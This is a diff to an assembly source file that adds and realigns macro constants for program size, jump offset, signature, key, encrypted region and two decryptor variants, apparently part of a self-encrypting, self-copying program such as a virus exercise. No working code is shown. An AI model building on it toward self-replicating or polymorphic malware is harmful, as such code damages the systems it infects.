@@ -1,13 +1,18 @@
-%define PROG_SIZE   _end - main
-%define JMP_OFFSET  jump - main
-%define SIGNATURE_SIZE _end - signature
-%define KEY_SIZE      signature - key
-%define KEY_OFFSET    key - main
-%define ENCRYPT_SIZE key - encrypted_start
-%define ENCRYPT_OFFSET encrypted_start - main
-%define READ_DIR_BUFF_SIZE  256
-%define PATH_BUFF_SIZE      1024
-%define PROCESS_PATH_LEN 100
+%define PROG_SIZE               _end - main
+%define JMP_OFFSET              jump - main
+%define SIGNATURE_SIZE          _end - signature
+%define KEY_SIZE                signature - key
+%define KEY_OFFSET              key - main
+%define ENCRYPT_SIZE            key - encrypted_start
+%define ENCRYPT_OFFSET          encrypted_start - main
+%define DECRYPT_KEY_OFFSET      key - decrypte
+%define DECRYPT_FUNC_SIZE       encrypted_start - decrypte
+%define DECRYPT_OFFSET          decrypte - main
+%define DECRYPT_V1_SIZE         decrypt_v1_end - decrypt_v1
+%define DECRYPT_V2_SIZE         decrypt_v2_end - decrypt_v2
+%define READ_DIR_BUFF_SIZE      256
+%define PATH_BUFF_SIZE          1024
+%define PROCESS_PATH_LEN        100
 %define PROCESS_STATUS_READ_SIZE 20
 
 
